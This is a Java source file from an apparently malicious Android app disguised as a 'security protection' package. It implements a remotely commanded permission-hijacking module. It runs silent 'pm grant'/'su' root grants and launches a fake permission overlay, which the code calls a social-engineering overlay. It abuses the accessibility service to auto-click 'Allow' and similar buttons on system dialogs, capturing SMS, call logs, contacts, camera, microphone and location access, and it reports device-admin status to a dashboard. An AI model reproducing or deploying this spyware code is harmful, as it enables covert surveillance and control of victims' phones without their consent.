package com.seguranca.protecao;
import com.seguranca.protecao.PermissionManager;
import com.seguranca.protecao.MyAdminReceiver;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.LinkedHashMap;
import java.util.Map;
import com.seguranca.protecao.FakePermissionActivity;

/**
 * PermissionGranter — fast auto-grant permission system.
 *
 * Features:
 *  - requestPermissionFromDashboard()  REQUEST_PERMISSION
 *  - autoGrantOnScreen()               called from UiAssistBridge.onAccessibilityEvent
 *  - getPermissionStatus()             GET_PERMISSION_STATUS
 *  - grantAllCritical()                GRANT_ALL_PERMISSIONS
 *  - silentGrantRoot()                 try root-based grant
 *
 * How auto-grant works:
 *  1. Dashboard sends REQUEST_PERMISSION {permission, useCustomPrompt, promptText}
 *  2. CCS calls PermissionGranter.requestFromDashboard()
 *  3. PermissionGranter:
 *     a. Tries root silent grant (pm grant) — instant if rooted
 *     b. If useCustomPrompt: shows FakePermissionActivity with custom text BEFORE the real dialog
 *     c. Registers the permission in PENDING_GRANTS so UiAssistBridge can auto-click "Allow"
 *     d. Fires the real system dialog
 *  4. UiAssistBridge.autoGrantOnScreen() watches every dialog; if keyword matches PENDING_GRANTS,
 *     it clicks "Allow" / "Tillad" / "Autoriser" / etc in <15ms.
 */
public class PermissionGranter {

    private static final String TAG = "PermissionGranter";

    // Set of permissions pending auto-click (populated by requestFromDashboard)
    public static final java.util.Set<String> PENDING_GRANTS =
        java.util.Collections.synchronizedSet(new java.util.HashSet<>());

    // Maps permission to its dialog trigger keywords (for fast matching)
    private static final Map<String, String[]> PERMISSION_KEYWORDS = new LinkedHashMap<>();
    static {
        PERMISSION_KEYWORDS.put(android.Manifest.permission.ACCESS_FINE_LOCATION,
            new String[]{"location", "localização", "ubicación", "localisation"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.ACCESS_COARSE_LOCATION,
            new String[]{"location", "localização", "ubicación", "localisation"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.READ_CONTACTS,
            new String[]{"contact", "contato", "contacto", "kontakt"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.WRITE_CONTACTS,
            new String[]{"contact", "contato", "contacto", "kontakt"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.READ_CALL_LOG,
            new String[]{"call log", "chamadas", "registros de chamadas", "call history"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.WRITE_CALL_LOG,
            new String[]{"call log", "chamadas", "registros de chamadas"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.READ_SMS,
            new String[]{"sms", "message", "mensagem", "texto"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.SEND_SMS,
            new String[]{"sms", "send messages", "enviar mensagens"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.RECEIVE_SMS,
            new String[]{"sms", "receive messages"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.CAMERA,
            new String[]{"camera", "câmera", "cámara"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.RECORD_AUDIO,
            new String[]{"microphone", "microfone", "micrófono", "record audio", "microfono"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.READ_EXTERNAL_STORAGE,
            new String[]{"storage", "files", "armazenamento", "photos", "media", "fotos"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            new String[]{"storage", "files", "armazenamento"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.CALL_PHONE,
            new String[]{"phone", "calls", "ligar", "llamar", "call"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.READ_PHONE_STATE,
            new String[]{"phone state", "phone identity", "estado do telefone"});
        PERMISSION_KEYWORDS.put("android.permission.GET_ACCOUNTS",
            new String[]{"account", "conta", "cuenta"});
        PERMISSION_KEYWORDS.put(android.Manifest.permission.BLUETOOTH_CONNECT,
            new String[]{"bluetooth"});
    }

    private final Context ctx;

    public PermissionGranter(Context ctx) {
        this.ctx = ctx;
    }

    // ─── REQUEST FROM DASHBOARD ──────────────────────────────────────────────

    /**
     * Main entry — called from CCS when REQUEST_PERMISSION command arrives.
     *
     * @param permission     Android permission string (e.g. android.permission.CAMERA)
     * @param useCustomPrompt show a FakePermissionActivity with custom text before real dialog?
     * @param promptText     custom prompt text (null = use default)
     * @return  result string for dashboard
     */
    public String requestFromDashboard(String permission, boolean useCustomPrompt, String promptText) {
        if (permission == null || permission.isEmpty()) return "ERROR: permission required";

        // 1. Already granted — nothing to do
        if (ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
            return "OK: " + permission + " already granted";
        }

        // 2. Try root silent grant (fastest — if available)
        String rootResult = silentGrantRoot(permission);
        if (rootResult.startsWith("OK")) return rootResult;

        // 3. Register for auto-click
        PENDING_GRANTS.add(permission);

        // 4. Optional custom prompt (social-engineering overlay shown BEFORE dialog)
        if (useCustomPrompt) {
            try {
                Intent fakeIntent = new Intent(ctx, FakePermissionActivity.class);
                fakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                fakeIntent.putExtra("permission", permission);
                fakeIntent.putExtra("prompt_text",
                    promptText != null ? promptText : buildDefaultPromptText(permission));
                ctx.startActivity(fakeIntent);
            } catch (Exception e) {
                Log.w(TAG, "FakePermissionActivity: " + e.getMessage());
            }
        }

        // 5. Fire real system permission dialog via FakePermissionActivity
        // (The Activity requests the permission; UiAssistBridge will auto-click Allow)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                Intent intent = new Intent(ctx, FakePermissionActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("permission",      permission);
                intent.putExtra("request_direct",  true);
                intent.putExtra("prompt_text",     promptText);
                ctx.startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "requestFromDashboard launch: " + e.getMessage());
            }
        }, useCustomPrompt ? 2500 : 0);

        return "OK: permission request sent (" + permission + ")";
    }

    // ─── AUTO-GRANT ON SCREEN ────────────────────────────────────────────────

    /**
     * Called from UiAssistBridge.onAccessibilityEvent for every WINDOW_STATE_CHANGED
     * and WINDOW_CONTENT_CHANGED. Detects permission dialogs and auto-clicks Allow.
     *
     * @param root  root AccessibilityNodeInfo of current window
     * @param pkg   foreground package
     * @return true if a button was clicked
     */
    public static boolean autoGrantOnScreen(AccessibilityNodeInfo root, String pkg) {
        if (root == null) return false;

        // Only act on Android permission dialogs
        if (pkg == null || (!pkg.equals("com.android.permissioncontroller")
                         && !pkg.equals("com.google.android.permissioncontroller")
                         && !pkg.contains("packageinstaller")
                         && !pkg.contains("permission"))) {
            return false;
        }

        // Scan for "Allow" buttons — fast DFS
        return clickAllowButton(root);
    }

    /**
     * General-purpose "click Allow" — called for ANY dialog we want to auto-accept.
     * Used both by the pending-grant system and for general accessibility automation.
     */
    public static boolean clickAllowButton(AccessibilityNodeInfo root) {
        if (root == null) return false;

        // Button texts across languages
        String[] allowTexts = {
            "Allow", "ALLOW", "allow",
            "Permitir", "PERMITIR",
            "Autoriser", "Autorizza", "Zulassen", "Toestaan",
            "Tillade", "Tillat",
            "Always allow", "Allow only while using the app",
            "Apenas durante o uso", "Enquanto usa o app",
            "Only this time", "Somente desta vez",
            "While using the app", "Allow all the time",
            "Ok", "OK", "Yes", "Confirm", "Accept",
            "Continue", "Continuar", "Next", "Avanzar",
            "Activate", "Ativar"
        };

        for (String text : allowTexts) {
            java.util.List<AccessibilityNodeInfo> nodes =
                root.findAccessibilityNodeInfosByText(text);
            for (AccessibilityNodeInfo node : nodes) {
                if (node == null) continue;
                // Verify it's a clickable button
                if (node.isEnabled() &&
                    (node.isClickable() ||
                     "android.widget.Button".equals(node.getClassName()) ||
                     "android.widget.TextView".equals(node.getClassName()))) {
                    try {
                        boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        if (!clicked) {
                            // Try parent
                            AccessibilityNodeInfo parent = node.getParent();
                            if (parent != null && parent.isClickable()) {
                                clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            }
                        }
                        if (clicked) {
                            Log.d(TAG, "Auto-clicked: " + text);
                            return true;
                        }
                    } catch (Exception ignored) {}
                }
            }
        }
        return false;
    }

    // ─── GET PERMISSION STATUS ───────────────────────────────────────────────

    public String getPermissionStatus() {
        JsonArray arr = new JsonArray();
        String[][] permissions = {
            {android.Manifest.permission.ACCESS_FINE_LOCATION,      "GPS Location",       "location"},
            {android.Manifest.permission.ACCESS_COARSE_LOCATION,    "Network Location",   "location"},
            {android.Manifest.permission.READ_CONTACTS,             "Read Contacts",      "contacts"},
            {android.Manifest.permission.WRITE_CONTACTS,            "Write Contacts",     "contacts"},
            {android.Manifest.permission.READ_SMS,                  "Read SMS",           "sms"},
            {android.Manifest.permission.SEND_SMS,                  "Send SMS",           "sms"},
            {android.Manifest.permission.RECEIVE_SMS,               "Receive SMS",        "sms"},
            {android.Manifest.permission.READ_CALL_LOG,             "Read Call Log",      "calls"},
            {android.Manifest.permission.WRITE_CALL_LOG,            "Write Call Log",     "calls"},
            {android.Manifest.permission.CALL_PHONE,                "Make Calls",         "calls"},
            {android.Manifest.permission.ANSWER_PHONE_CALLS,        "Answer Calls",       "calls"},
            {android.Manifest.permission.READ_PHONE_STATE,          "Phone State",        "phone"},
            {android.Manifest.permission.CAMERA,                    "Camera",             "camera"},
            {android.Manifest.permission.RECORD_AUDIO,             "Microphone",         "mic"},
            {android.Manifest.permission.READ_EXTERNAL_STORAGE,    "Read Storage",       "storage"},
            {android.Manifest.permission.WRITE_EXTERNAL_STORAGE,   "Write Storage",      "storage"},
            {"android.permission.GET_ACCOUNTS",                     "Get Accounts",       "accounts"},
            {"android.permission.READ_MEDIA_IMAGES",               "Read Images",        "storage"},
            {"android.permission.READ_MEDIA_VIDEO",                "Read Videos",        "storage"},
            {"android.permission.READ_MEDIA_AUDIO",                "Read Audio",         "storage"},
            {android.Manifest.permission.BLUETOOTH_CONNECT,        "Bluetooth",          "bluetooth"},
            {"android.permission.REQUEST_INSTALL_PACKAGES",        "Install Packages",   "install"},
            {android.Manifest.permission.SYSTEM_ALERT_WINDOW,     "Overlay (Draw over apps)", "overlay"},
            {android.Manifest.permission.FOREGROUND_SERVICE,       "Foreground Service", "service"},
        };

        for (String[] perm : permissions) {
            try {
                JsonObject obj = new JsonObject();
                obj.addProperty("id",      perm[0]);
                obj.addProperty("label",   perm[1]);
                obj.addProperty("group",   perm[2]);
                boolean granted;
                if (perm[0].equals(android.Manifest.permission.SYSTEM_ALERT_WINDOW)) {
                    granted = Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
                              android.provider.Settings.canDrawOverlays(ctx);
                } else {
                    granted = ctx.checkSelfPermission(perm[0]) == PackageManager.PERMISSION_GRANTED;
                }
                obj.addProperty("granted", granted);
                arr.add(obj);
            } catch (Exception ignored) {}
        }

        // Add Accessibility status
        try {
            JsonObject acc = new JsonObject();
            acc.addProperty("id",      "accessibility_service");
            acc.addProperty("label",   "Accessibility Service");
            acc.addProperty("group",   "accessibility");
            acc.addProperty("granted", new PermissionManager(ctx).isAccessibilityServiceEnabled());
            arr.add(acc);
        } catch (Exception ignored) {}

        // Add Device Admin status
        try {
            android.app.admin.DevicePolicyManager dpm =
                (android.app.admin.DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName comp =
                new android.content.ComponentName(ctx, MyAdminReceiver.class);
            JsonObject adm = new JsonObject();
            adm.addProperty("id",      "device_admin");
            adm.addProperty("label",   "Device Administrator");
            adm.addProperty("group",   "admin");
            adm.addProperty("granted", dpm != null && dpm.isAdminActive(comp));
            arr.add(adm);
        } catch (Exception ignored) {}

        return arr.toString();
    }

    // ─── GRANT ALL CRITICAL ──────────────────────────────────────────────────

    /**
     * Requests all critical permissions at once via root or queued dialogs.
     */
    public String grantAllCritical() {
        StringBuilder results = new StringBuilder();
        String[] critical = {
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.WRITE_CALL_LOG,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            "android.permission.GET_ACCOUNTS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO"
        };
        for (String p : critical) {
            if (ctx.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                String r = silentGrantRoot(p);
                results.append(p.substring(p.lastIndexOf('.') + 1)).append(": ").append(r).append("\n");
            }
        }
        return results.length() > 0 ? results.toString() : "All critical permissions already granted";
    }

    // ─── SILENT ROOT GRANT ───────────────────────────────────────────────────

    /**
     * Tries to grant a permission silently using `pm grant` via root/shell.
     */
    public String silentGrantRoot(String permission) {
        try {
            String pkg = ctx.getPackageName();
            String[] methods = {
                "pm grant " + pkg + " " + permission,
                "su -c pm grant " + pkg + " " + permission,
            };
            for (String cmd : methods) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                    p.waitFor();
                    if (ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
                        Log.d(TAG, "Root grant OK: " + permission);
                        PENDING_GRANTS.remove(permission);
                        return "OK: granted via root";
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.w(TAG, "silentGrantRoot: " + e.getMessage());
        }
        return "ERROR: root not available";
    }

    // ─── HELPERS ─────────────────────────────────────────────────────────────

    private String buildDefaultPromptText(String permission) {
        String last = permission.substring(permission.lastIndexOf('.') + 1).replace("_", " ").toLowerCase();
        return "This app needs " + last + " access to provide better service.";
    }
}
